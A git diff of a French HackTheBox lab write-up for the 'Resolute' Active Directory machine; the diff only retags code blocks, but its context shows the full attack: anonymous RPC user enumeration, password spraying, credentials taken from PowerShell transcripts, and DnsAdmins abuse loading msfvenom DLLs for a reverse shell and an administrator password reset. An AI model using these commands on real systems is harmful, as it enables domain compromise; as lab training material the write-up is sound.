@@ -20,7 +20,7 @@ Resolute est une machine Windows de Niveau Medium et est dotée d'Active Directo
 ## Reconnaissance
 Pour commender, je commence avec une petite recherche de nmap.
 
-```terminal
+```bash
 ─# /home/blo/tools/nmapautomate/nmapauto.sh $ip
 
 ###############################################
@@ -114,7 +114,7 @@ Open Ports : 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,4
 
 Avec ce script j'ai eu plusieurs ports ouverts, Un  second scan
 
-```terminal
+```sh
 └─# nmap -sCV -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49670,49676,49677,49686,49711,49760 10.129.96.155
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 19:44 CST
 Host is up (0.20s latency).
@@ -185,7 +185,7 @@ A travers ces resultats je trouve des choses importants :
 
 **Commencons par le SMB**
 
-```
+```sh
 └─# nxc smb $ip -u '' -p '' --shares
 SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
 SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\: 
@@ -196,7 +196,7 @@ Ici je trouve un user anonyme mais je peux pas lister les shares, Alors...
 
 **Allons vers le MSRPC**
 
-```
+```sh
 └─# rpcclient -U '' -N 10.129.96.155
 rpcclient $> enumdomains
 name:[MEGABANK] idx:[0x0]
@@ -205,7 +205,7 @@ rpcclient $>
 ```
 Good, je peux bien enumerer les domaines dans le `rpcclient`, Donc enumerons les informations des utilisateurs avec le `querydispinfo`
 
-```terminal
+```sh
 rpcclient $> querydispinfo
 index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
 index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
@@ -238,7 +238,7 @@ index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (n
 
 Avec toutes ces informations, jarrive a trouver un mot de passe `Welcome123!` de l'utilisateur `marko`. Mais en l'essayant elle marche pas avec cet utilisateur
 
-```terminal
+```sh
 └─# nxc smb $ip -u 'marko' -p 'Welcome123!' --shares
 SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
 SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
@@ -247,7 +247,7 @@ SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Wel
 
 Alors quoi faire ? je vais enumerer toutes les utilisateurs du domaine et ensuite voir si ce mot de passe fonctionne avec un autre utilisateur grace au *PasswordSpraying*
 
-```terminal
+```sh
 └─# rpcclient -U '' -N 10.129.96.155 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x'  | tr -d '[]' > res_user
 Administrator
 Guest
@@ -289,7 +289,7 @@ Avec `nxc` j'ai eu `melanie` comme etant valides avec le mot de passe que j'ai t
 **Mouvement Lateral**
 Pour faire un Mouvement Lateral a partir de cet utilisateur vers un autre utilisateur, je vais d'abord me rendre au repertoire `C:\`
 
-```terminal
+```sh
 *Evil-WinRM* PS C:\> dir -force
 
 
@@ -316,7 +316,7 @@ d-----        12/4/2019   5:15 AM                Windows
 
 A partir de ceci je trouve un fichier cachee `PSTranscripts`
 
-```terminal
+```sh
 *Evil-WinRM* PS C:\PSTranscripts> dir -force
 
 
@@ -344,7 +344,7 @@ Mode                LastWriteTime         Length Name
 ```
 
 Je trouve plusieurs fichiers cachee dans ce `PSTranscripts`, aussi un fichier `.txt` tres interessant. A l'interieur je trouve 
-```terminal
+```sh
 At line:1 char:1
 + cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
 + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -359,7 +359,7 @@ Un utilisateur `ryan` et aussi un mot de passe `Serv3r4Admin4cc123!`
 (Pwn3d!), Mais est-ce que je suis vraiment Admin de la Box maintenant ?
 - Pour verifier je vais utiliser `secretsdump` pour essayer d'extraire les secrets `NTDS.DIT`
 
-```terminal
+```sh
 └─# impacket-secretsdump megabank.local/ryan:Serv3r4Admin4cc123\!@10.129.234.83
 Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra
 
@@ -376,7 +376,7 @@ Ca ne marche pas
 ## Privilege Escalation
 Avec cet utilisateur, je vais aussi me connecter au `winrm` pour voir si je pourrais escalader mes privileges.
 
-```terminal
+```sh
 Evil-WinRM* PS C:\Users\ryan\Documents> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -391,7 +391,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 Rien d'interessant dans les privileges, et si je verifiais les `groups`
 
-```terminal
+```sh
 *Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups
 
 GROUP INFORMATION
@@ -420,7 +420,7 @@ Pour l'abuser alors je vais :
 - Creer un DLL Malicieux pour avoir un shell
 - ce DLL va s'executer par DNS et qui va ensuite me donner une connexion en tantque SYSTEM sur la machine victime dans le Controlleur de Domaine
 
-```terminal
+```sh
 └─# msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.14.16 LPORT=443 -f dll -o reverse.dll
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -434,7 +434,7 @@ Saved as: reverse.dll
 
 Je cree un server smb local pour avoir le `dll` dans la machine victime lors de l'execution du DNS
 
-```
+```sh
 ─# impacket-smbserver s .
 Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra
 
@@ -447,7 +447,7 @@ Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra
 ```
 
 
-```terminal
+```sh
 *Evil-WinRM* PS C:\Users\ryan\Desktop> dnscmd.exe /config /serverlevelplugindll \\10.10.14.16\s\reverse.dll
 
 Registry property serverlevelplugindll successfully reset.
@@ -479,7 +479,7 @@ SERVICE_NAME: dns
 
 Dans ma reponse SMB j'ai
 
-```
+```sh
 └─# impacket-smbserver s .
 Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra
 
@@ -499,7 +499,7 @@ Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra
 Et si j'essayais de changer le mot de passe de l'administrateur avec un autre DLL?
 
 
-```terminal
+```sh
 └─# msfvenom -p windows/x64/exec cmd='net user administrator Password1 /domain' -f dll > dn.dll 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -510,7 +510,7 @@ Final size of dll file: 9216 bytes
 
 Ensuite la meme methode, mais avec `cmd` cett fois
 
-```terminal
+```sh
 *Evil-WinRM* PS C:\Users\ryan\Desktop> cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.16\s\dn.dll
 
 Registry property serverlevelplugindll successfully reset.
@@ -546,7 +546,7 @@ SERVICE_NAME: dns
 Et voilaaa...
 
 
-```terminal
+```sh
 └─# nxc smb 10.129.234.83 -u 'administrator' -p 'Password1' -x "type C:\users\administrator\desktop\root.txt" 
 SMB         10.129.234.83   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
 SMB         10.129.234.83   445    RESOLUTE         [+] megabank.local\administrator:Password1 (Pwn3d!)
